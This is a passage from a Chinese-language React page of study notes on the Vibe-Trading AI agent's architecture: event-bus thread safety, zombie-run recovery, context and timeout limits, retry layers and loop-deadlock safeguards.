            <p><strong>reasoning chunk 节流</strong>（loop.py:660-678）：长推理模型产生几百个 chunk，无脑转发会撑爆 SSE buffer。每秒最多 emit 一次（首个 chunk 立发保 UI 响应）——这是背压控制的实战经验。</p>
          </Details>

          <Details summary="⑤ 跨线程通信：EventBus 修了 asyncio.Queue 跨线程的经典坑">
            <p>同步 agent 线程 emit 事件，异步 SSE 消费。<strong>不能直接 <code>asyncio.Queue.put_nowait()</code> 跨线程</strong>——它不是线程安全的，会 corrupt queue 内部 waker。</p>
            <p>解决方案（events.py:87-112）：用官方推荐的 <code>loop.call_soon_threadsafe()</code> 桥接——唤醒 event loop 的 self-pipe，由 loop 自己在正确线程执行入队。文件头注释明说「V5: Fixes the thread-safety issue」——踩过坑后修的。Buffer 滑窗 500 条，支持 Last-Event-ID 断线重连 replay。</p>
          </Details>

          <Details summary="⑥ 崩溃恢复：Swarm zombie 回收的三层阈值 clamp">
            <p>host crash 后留下「僵尸 running」是分布式经典问题。这个项目基于文件 store，靠<strong>心跳 + 三层 clamp</strong>做活性检测（store.py:311-342）：</p>
            <KV
              rows={[
                ['下限 60s', '防心跳亚秒级抖动误判'],
                ['heartbeat × 10', '心跳每 3s 一次，missing 10 个（≈30s）说明没进展'],
                ['上限 = retry_ceiling + 60s', '不能超过 max(agent_timeout × (retries+1))，防心跳被运维关掉时误杀合法长任务'],
              ]}
            />
            <p>每次 start_run 先 reap stale（runtime.py:107-116），三种 reconcile：hydrate（合并 task 文件）/ terminal recovery（推导真实状态）/ stale reap（超阈值 mark failed）。API 层 SSE 端点也兜底 reconcile，让 zombie run 能在 SSE 里正常关闭。</p>
          </Details>

          <Details summary="⑦ 韧性工程：超长上下文 + 超时分层 + 重试 + 死锁防护全景">
            <p>这是面试最容易被深挖的「系统韧性」问题。Vibe-Trading 的韧性是<strong>分层正交</strong>设计的，每层防不同故障。</p>

            <SubHeading>超长上下文：5 层压缩之外的 6 个辅助手段</SubHeading>
            <KV
              rows={[
                ['TOOL_RESULT_LIMIT=10000', '工具结果给 LLM 截到 10K 字符（loop.py:53）；但 trace 保留全量脱敏版——双轨制'],
                ['工具内部 50000', 'bash/read_file 自己再截 50K（bash_tool.py:11），最终 LLM 只看 10K'],
                ['12K 字符历史预算', '_convert_messages_to_history 跨 session 历史裁到 12000 字符（service.py:319）'],
                ['progressive disclosure', 'system prompt 只注入 skill 一行摘要，全文按需 load_skill'],
                ['max_iterations=50', '超了强制纯文本输出（loop.py:681-685），80% 时注入 wrap-up 催促'],
                ['prompt cache 友好', 'memory snapshot session 内冻结保 system prompt 稳定（命中缓存省钱）'],
              ]}
            />

            <SubHeading>超时分层：18 个超时点，各防各的故障</SubHeading>
            <CompareTable
              head={['超时', '默认值', '防什么']}
              rows={[
                ['单次 LLM 调用 (TIMEOUT_SECONDS)', '120s', '请求卡死/网关 hang'],
                ['LLM SDK 重试 (MAX_RETRIES)', '2 次', '瞬时 429/5xx（SDK 盲重试）'],
                ['工具执行 (VIBE_TRADING_TOOL_TIMEOUT_SECONDS)', '1800s', '工具卡死（write 只 warn 不杀）'],
                ['bash subprocess', '120s', '单条 shell 挂死'],
                ['回测子进程', '300s', '回测死循环/数据超时'],
                ['Swarm worker', '300s', '单 worker 跑太久'],
                ['SSE 空闲', '90s', '后端假死连接未断'],
                ['心跳', '3s', '长工具发"还活着"信号'],
                ['循环上限', '50 次', '工具死循环'],
              ]}
            />

            <SubHeading>重试：三层叠加，各管各的粒度</SubHeading>
            <KV
              rows={[
                ['SDK 盲重试 2 次', 'LangChain ChatOpenAI 内置，针对 429/5xx/连接抖动，指数退避'],
                ['stream 显式重试 1 次', 'loop.py:694-726，只对 retryable 错误（408/429/5xx），清 partial delta 防重复'],
                ['worker 整体重跑', 'runtime.py:633-727，整个 worker 重新跑 ReAct，token 跨 attempt 累加（防账单少算）'],
                ['工具不重试', '失败返回 error JSON 让模型自我纠正（换参数/换工具）'],
                ['数据源 backoff', 'retry_with_budget 4 次（0.5/1.5/4s），受 deadline 封顶，只重试 transient'],
              ]}
            />
            <Callout type="info" title="retryable 判定（chat.py:103-116）">
              <strong>可重试</strong>：无 HTTP 状态（连接重置）/ 408 超时 / 429 限流 / 5xx 服务端错。
              <strong>不可重试</strong>：400/401/403/404 等 4xx 客户端错（重试也是同样错，浪费）。
            </Callout>

            <SubHeading>死锁/无限循环防护清单</SubHeading>
            <KV
              rows={[
                ['_called_ok 去重', '非 repeatable 工具成功后再调直接拦截，防重复下单'],
                ['max_iterations 硬上限', '50 轮强制结束'],
                ['auto_compact head 空兜底', 'loop.py:1474-1482，强制对半切避免"压缩→仍超→再压"死循环'],
                ['cooperative cancel 多点', '迭代边界/stream chunk/tool batch 三处轮询 is_set()'],
                ['layer deadline + cancel_futures', '防 worker 卡 C 扩展绕过 in-loop 检查'],
                ['stale-run reaper', 'start_run 时清理崩溃留下的僵尸 run'],
                ['_fix_tool_pairs', '压缩后修复孤儿 tool_call/result 配对（防 provider 400）'],
              ]}
            />
          </Details>
        </div>
      </Section>

      {/* 小结 */}
      <Section eyebrow="小结" title="架构篇核心要点">
        <div className="grid md:grid-cols-2 gap-3">
          {[
            ['自研 ReAct 循环', '边想边调工具，不依赖框架'],
            ['5 层上下文压缩', '长对话不爆 token 的关键'],
            ['工具自动发现', '加工具 = 加一个类文件'],
            ['多模型抽象', '14+ 供应商统一接口'],
            ['文件式记忆', '零依赖、可读、可手编'],
            ['Fail-closed 哲学', '不确定就停下问人'],
          ].map(([t, d]) => (
            <div key={t} className="flex items-start gap-3 rounded-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 p-3">
              <GitBranch size={16} className="mt-0.5 text-brand-500 shrink-0" />
              <div>
                <div className="font-medium text-slate-900 dark:text-white text-sm">{t}</div>
                <div className="text-sm text-slate-600 dark:text-slate-400">{d}</div>
              </div>
            </div>
          ))}
        </div>
      </Section>
    </>
  );
}
